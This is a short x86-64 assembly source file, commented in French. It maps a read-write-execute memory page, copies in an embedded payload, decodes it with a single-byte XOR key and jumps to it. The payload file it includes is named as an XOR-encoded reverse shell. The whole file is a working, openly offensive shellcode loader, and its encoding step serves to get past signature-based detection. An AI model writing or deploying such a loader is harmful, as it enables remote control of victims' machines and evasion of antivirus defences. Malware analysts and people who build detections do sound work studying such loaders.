BITS 64
global _start

_start:
    ; mmap(NULL, 0x1000, RWX, MAP_ANON|MAP_PRIVATE, -1, 0)
    xor     rdi, rdi        ; addr = NULL
    mov     rsi, 0x1000     ; taille = 4096
    mov     rdx, 7          ; PROT_READ|PROT_WRITE|PROT_EXEC
    mov     r10, 0x22       ; MAP_ANON|MAP_PRIVATE
    mov     r8, -1          ; fd = -1
    xor     r9, r9          ; offset = 0
    mov     rax, 9          ; syscall mmap = 9
    syscall
    mov     r15, rax        ; r15 = adresse RWX

    ; copier le shellcode chiffré dans la zone RWX
    lea     rsi, [rel payload]
    mov     rdi, r15
    mov     rcx, payload_fin - payload
    rep     movsb

    ; déchiffrer en mémoire
    mov     rsi, r15
    mov     rcx, payload_fin - payload
dechiffre:
    xor     byte [rsi], 0x41
    inc     rsi
    loop    dechiffre

    ; sauter vers le shellcode déchiffré
    jmp     r15

payload:
    incbin "payload/reverse_shell_xor.bin"
payload_fin: